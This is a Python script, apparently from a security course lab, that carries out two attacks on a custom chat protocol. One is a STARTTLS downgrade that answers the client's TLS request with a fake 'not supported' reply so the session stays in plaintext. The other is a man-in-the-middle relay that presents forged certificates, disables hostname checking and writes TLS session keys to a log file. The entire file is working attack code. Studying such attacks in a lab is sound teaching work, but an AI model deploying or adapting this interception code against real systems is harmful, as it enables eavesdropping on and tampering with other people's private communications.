import socket
import sys
import ssl

def DowngradeAttackProcedures(VictimClient, VictimServer):
    
    #Create server for  VictimClient
    ServerSocket = socket.socket()
    host = socket.gethostname()
    ip = socket.gethostbyname(host)
    port = 9009
    ServerSocket.bind((host, port))
    VictimClientIP = socket.gethostbyname(VictimClient)
    
    ServerSocket.listen(5)
    print("Trudy's server is ready. ")
    conn, addr = ServerSocket.accept()
    print("Received connection from victm client", addr[0], "(", addr[1], ")")

    #connect to VictimServer on the basis of VictimClient
    ClientSocket = socket.socket()
    shost = socket.gethostname()
    ip = socket.gethostbyname(shost)

    VictimServerIP = socket.gethostbyname(VictimServer)
    VictimServerPort = str('9009')

    ClientSocket.connect((str(VictimServerIP), int(VictimServerPort)))
    print("Connected to victim server")

    while True:
        FlagWaitForVictimServerReply= 1

        #receive message from victim client
        Received = conn.recv(1024)
        Received = Received.decode()
        print("client: " + str(Received))

        # block TLS starting and forward message to cictim server
        if (Received ==  'chat_STARTTLS'):
            message = "chat_STARTTLS_NOT_SUPPORTED "
            FlagWaitForVictimServerReply = 0
            conn.send(message.encode())

        elif (Received ==  'chat_close'):
            print("Victim client closing connection")
            ClientSocket.send(Received.encode())
            exit(0)

        else:
            # Just simply forward message to victim server
            ClientSocket.send(Received.encode())

        if (FlagWaitForVictimServerReply == 1):
            #Get reply from Victim server
            Received = ClientSocket.recv(1024)
            Received = Received.decode()
            print("Server: " + str(Received))

            if (Received ==  'chat_close'):
                print("Victim server closing connection")
                conn.send(Received.encode())
                exit(0)
            else:
                # just simply forward reply to Victim client
                conn.send(Received.encode())
            

def MITMAttackProcedures(VictimClient, VictimServer):

    # *****************************************************************************************
    # ************************************** Attacker as server *******************************
    # *****************************************************************************************

    #Create server for  VictimClient
    ServerSocket = socket.socket()
    host = socket.gethostname()
    ip = socket.gethostbyname(host)
    port = 9009
    ServerSocket.bind((host, port))
    VictimClientIP = socket.gethostbyname(VictimClient)
    
    ServerSocket.listen(5)
    print("Trudy's server is ready. ")
    conn, addr = ServerSocket.accept()
    print("Received connection from victm client", addr[0], "(", addr[1], ")")


    # *****************************************************************************************
    # ************************************** Attacker as client *******************************
    # *****************************************************************************************

    #connect to VictimServer on the basis of VictimClient
    ClientSocket = socket.socket()
    shost = socket.gethostname()
    ip = socket.gethostbyname(shost)

    VictimServerIP = socket.gethostbyname(VictimServer)
    VictimServerPort = str('9009')

    ClientSocket.connect((str(VictimServerIP), int(VictimServerPort)))
    print("Connected to victim server")
    Received = ""

    while True:

        if(Received ==  'chat_STARTTLS_ACK'):
            # TLS is enabled at server side of attacker here
            #conn.send(Received.encode())
            server_cert = 'fake_bob.crt'
            server_key = 'fake_bob.key'
            client_certs = 'root.crt'
            context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            #context.verify_mode = ssl.CERT_REQUIRED
            context.load_cert_chain(certfile=server_cert, keyfile=server_key)
            context.keylog_filename="keylog.txt"
            #context.load_verify_locations(cafile=client_certs)
            conn = context.wrap_socket(conn, server_side=True)
            

            # TLS is enabled at client side of attacker here
            client_cert = 'fake_alice.crt'
            client_key = 'fake_alice.key'
            context2 = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
            #context.load_cert_chain(certfile=client_cert, keyfile=client_key)
            context2.check_hostname = False
            ClientSocket = context2.wrap_socket(ClientSocket, server_side=False, server_hostname=VictimServer, do_handshake_on_connect=False)
            ClientSocket.do_handshake()
            

        #receive message from victim client
        Received = conn.recv(1024)
        Received = Received.decode()
        print("client: " + str(Received))

        if (Received ==  'chat_close'):
            print("Victim client closing connection")
            ClientSocket.send(Received.encode())
            exit(0)

        else:
            # Just simply forward message to victim server
            ClientSocket.send(Received.encode())

        #Get reply from Victim server
        try:
            Received = ClientSocket.recv(1024)
            Received = Received.decode()
            print("Server: " + str(Received))
        except:
            print("error")

        if (Received ==  'chat_close'):
            print("Victim server closing connection")
            conn.send(Received.encode())
            exit(0)
     
        else:
            # just simply forward reply to Victim client
            conn.send(Received.encode())


if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Invalid no  of arguments")
        exit(-1)

    if(sys.argv[1] == "-d"):
        print("Downgrade attack")
        VictimClient =  sys.argv[2]
        VictimServer = sys.argv[3]
        DowngradeAttackProcedures(VictimClient, VictimServer)

    if(sys.argv[1] == "-m"):
        print("MITM attack")
        VictimClient =  sys.argv[2]
        VictimServer = sys.argv[3]
        MITMAttackProcedures(VictimClient, VictimServer)